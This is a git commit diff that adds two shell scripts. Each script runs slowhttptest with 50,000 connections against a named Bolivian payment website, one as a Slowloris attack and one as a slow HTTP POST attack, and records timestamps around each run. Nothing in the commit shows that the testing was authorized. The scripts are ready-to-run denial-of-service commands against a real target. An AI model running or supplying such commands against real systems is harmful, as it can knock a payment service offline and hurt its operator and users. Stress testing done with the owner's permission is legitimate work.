3640bbc371bd8a27b7e30f86dc5d90d62519071f
Franz Alvis <alvis.cornejo.franzreinaldo@usfx.bo>
2025-08-20 23:15:27 -0400

    second

---
+++ pagos/1-3-httpslow-slowloris.sh
@@ -0,0 +1,4 @@
+date >> 1-3-date.txt
+slowhttptest -c 50000 -H -g -o 1-3-httpslow-slowloris -i 10 -r 1000 -l 300 -t GET -u https://pagosbolivia.com.bo/ -x 24 -p 3
+date >> 1-3-date.txt
+
---
+++ pagos/2-3-httpslow-HTTP_post.sh
@@ -0,0 +1,4 @@
+date >> 2-3-date.txt
+slowhttptest -c 50000 -B -g -o 2-3-httpslow-POST -i 10 -r 1000 -l 300 -t GET -u https://pagosbolivia.com.bo/ -x 24 -p 3
+date >> 2-3-date.txt
+
